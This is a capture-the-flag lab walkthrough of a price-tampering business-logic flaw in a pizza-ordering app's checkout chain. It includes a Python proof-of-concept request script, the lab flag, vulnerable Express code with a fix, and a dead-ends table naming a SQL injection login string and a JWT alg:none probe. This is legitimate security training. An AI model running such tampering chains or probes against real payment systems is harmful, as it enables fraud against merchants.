# cheesy-006 - BugForge Lab Walkthrough

**URL:** https://lab-1784966600189-3pbcr4.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Business logic flaw - tip percentage price tampering on order checkout
**Flag:** `bug{Kh1zvKb5HyuyB5xphJbquRQjJoEQaoiu}`

---

## Summary

Cheesy Does It is a pizza ordering SPA with a standard checkout flow: validate payment, process
payment, then create the order. The order creation endpoint recomputes the order total
server-side and compares it against the amount that was actually paid, which sounds solid. The
catch is that the "amount" submitted at the payment-validation step is entirely client-controlled
and is never checked against a real cart value, only checked for being greater than zero. Combined
with the fact that a negative tip percentage is floored to zero rather than rejected outright, an
attacker can submit a wildly out-of-range negative tip and still get the order accepted, as long as
the "amount" paid is set to match what that floored tip legitimately computes to.

---

## Tech Stack

- React SPA (Create React App, MUI)
- Express.js
- JWT auth (Bearer token issued on register/login)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register`, `/api/login` | POST | No | Returns a usable JWT directly |
| `/api/menu/pizzas`, `/api/menu/bases`, `/api/menu/sauces`, `/api/menu/toppings` | GET | JWT | Menu catalog |
| `/api/payment/validate` | POST | JWT | `{card_number, exp_month, exp_year, cvv, amount, tip}` returns `{payment_token, total}` |
| `/api/payment/process` | POST | JWT | `{card_number, amount, payment_token}`, `amount` must equal the `total` from validate |
| `/api/orders` | POST | JWT | `{items, delivery_address, phone, payment_method, notes, payment_token, tip}` - creates the order after recomputing and checking the total |
| `/api/admin/*` | GET | JWT + admin role | Correctly role gated |

---

## Discovery

### Step 1 - Recon and ruling out the obvious classes

Registration returns a usable JWT directly. The JS bundle exposes the full API surface (menu,
payment, orders, admin, profile). Standard checks came up clean: no SQL injection on login, no
`alg:none` JWT bypass, mass assignment of `role` on registration was silently ignored, and the
admin endpoints correctly return 401/403 without a valid admin token.

### Step 2 - Mapping the checkout flow

The checkout process is a three-call chain:

1. `POST /api/payment/validate` with the card details, a client-computed cart `amount`, and a
   `tip` percentage. Returns a `payment_token` and a `total` (`amount + tip% of amount`).
2. `POST /api/payment/process` with the same `payment_token` and an `amount` that must match the
   `total` returned above.
3. `POST /api/orders` with the cart `items`, the same `payment_token`, and the `tip` again.

Digging into the frontend bundle showed that pizza pricing is computed from a base price plus
modifiers for the selected crust, sauce, toppings, and size, multiplied by quantity. Cart items are
submitted with human-readable fields (`base_name`, `sauce_name`, `toppings`, `size`, `quantity`)
rather than raw ids.

### Step 3 - Testing every write endpoint in the chain for missing validation

With the standard vuln classes ruled out, each field in the checkout chain was tested
systematically for server-side trust issues, which is the standard approach for finding business
logic and IDOR-style flaws once auth and injection are ruled out:

- Submitting a client-supplied `total_price` directly on a cart item was **not** trusted - the
  server independently recomputes the price from the item's `base_name`/`sauce_name`/`toppings`/
  `size`/`quantity` fields and rejects a mismatch with `{"error":"Order total does not match
  payment amount","calculated":...,"paid":...}`. This error message conveniently reveals the true
  server-computed price on every failed attempt, which made it a useful oracle for testing further
  ideas without needing to complete a real order each time.
- Trying a negative `tip` value showed the server floors the tip contribution to zero rather than
  rejecting it, and does so consistently in both the validate and order-creation steps
  (`Math.max(0, tip)` in both places). Various type-confusion attempts (string, array, object,
  boolean, `-Infinity`) on the `tip` field all produced the same floored result, so there was no
  bypass of the floor itself.
- The important gap was in the `amount` field at the `/api/payment/validate` step: it is entirely
  client-chosen and is only checked for being greater than zero, with no cross-check against the
  real cart contents at that point in the flow. The only real enforcement happens later, in
  `/api/orders`, where the recomputed item total must equal what was actually paid.

### Step 4 - Exploiting the gap

Because `amount` at the validation step is free-form, it can simply be set to whatever a large
negative tip will floor down to. For a minimal item (a small, plain, thin-crust custom pizza
priced at $7.19), setting `amount=7.192` and `tip=-500`:

- `/api/payment/validate` floors the tip contribution to zero and returns `total=7.192`, matching
  `amount` exactly.
- `/api/payment/process` charges that `total`.
- `/api/orders` is submitted with the same deeply negative `tip=-500`. Its own recomputed total
  also floors to the item price of `7.192`, which matches what was paid, so the order is accepted
  despite carrying a nonsensical `-500%` tip value all the way through.

The order creation response returned the flag directly in the `order_number` field in place of the
normal generated order number:

```json
{"id":6,"order_number":"bug{Kh1zvKb5HyuyB5xphJbquRQjJoEQaoiu}","message":"Order created successfully","status":"received"}
```

---

## Proof of Concept

```python
import requests

BASE = "https://lab-1784966600189-3pbcr4.labs-app.bugforge.io"

# Register a fresh account
r = requests.post(f"{BASE}/api/register", json={
    "username": "tipuser123", "password": "Password123!", "email": "tipuser123@test.com"
})
token = r.json()["token"]
H = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

item = {
    "pizza_name": "Custom Pizza", "base_name": "Thin Crust", "sauce_name": "Classic Tomato",
    "size": "Small", "toppings": [], "quantity": 1, "unit_price": 7.19, "total_price": 7.19
}

s = requests.Session()
s.headers.update(H)
tip = -500

val = s.post(f"{BASE}/api/payment/validate", json={
    "card_number": "4444444444444444", "exp_month": "12", "exp_year": "25",
    "cvv": "123", "amount": 7.192, "tip": tip
}).json()

pt = val["payment_token"]
s.post(f"{BASE}/api/payment/process", json={
    "card_number": "4444444444444444", "amount": val["total"], "payment_token": pt
})

order = s.post(f"{BASE}/api/orders", json={
    "items": [item], "delivery_address": "1 Test St", "phone": "1234567890",
    "payment_method": "card", "notes": "", "payment_token": pt, "tip": tip
})

print(order.json())  # order_number field contains the flag
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| SQL injection on login (`' OR 1=1--`) | 400, parameterized query | Not injectable |
| Mass assignment of `role:"admin"` on register | Silently ignored server-side | Not vulnerable here |
| JWT `alg:none` | 403, rejected | Custom validation rejects it |
| Unauthenticated access to `/api/admin/*` | 401 | Properly gated |
| Client-supplied `total_price`/`unit_price` on cart items | Ignored, server recomputes independently | Not the vulnerable field |
| Negative `quantity` on an item | Server total genuinely goes negative, but the paid `amount` must be greater than zero at the validation step, so it can never match | Correctly-shaped dead end, not the intended path |
| Type confusion on `tip` (string, array, object, boolean, `-Infinity`) | All floored identically to `tip=0` | No bypass of the floor logic itself |

---

## Root Cause

The order-creation endpoint trusts a client-controlled base `amount` at the payment-validation
step with no cross-check against real cart contents, and applies the same non-negative floor to
the tip percentage in two separate places without ever rejecting an out-of-range value outright.
An attacker who understands the floor behavior can reverse-engineer an `amount` that satisfies the
final equality check while still passing an arbitrary, nonsensical tip value all the way through to
order creation.

```javascript
// Vulnerable pattern (approximate)
app.post("/api/payment/validate", authenticate, (req, res) => {
  const { amount, tip } = req.body;
  if (!amount || amount <= 0) return res.status(400).json({ valid: false, error: "Valid amount is required" });
  const total = amount + (Math.max(0, tip) / 100) * amount; // amount never checked against a real cart
  // ...issue payment_token, store { amount, tip, total }
});

app.post("/api/orders", authenticate, (req, res) => {
  const calculated = computeItemsTotal(req.body.items) * (1 + Math.max(0, req.body.tip) / 100);
  if (calculated.toFixed(2) !== paidTotal.toFixed(2)) {
    return res.status(400).json({ error: "Order total does not match payment amount", calculated, paid: paidTotal });
  }
  // ...create order with the raw, unvalidated tip value
});
```

The fix is to bound `tip` to a sane range (e.g. 0-100) and reject anything outside it instead of
silently flooring it, and to derive `amount` server-side from the real cart contents rather than
trusting a client-supplied figure at the validation step.

---

## CWE / OWASP

- **CWE-840**: Business Logic Errors
- **CWE-20**: Improper Input Validation
- **OWASP A04:2021** - Insecure Design
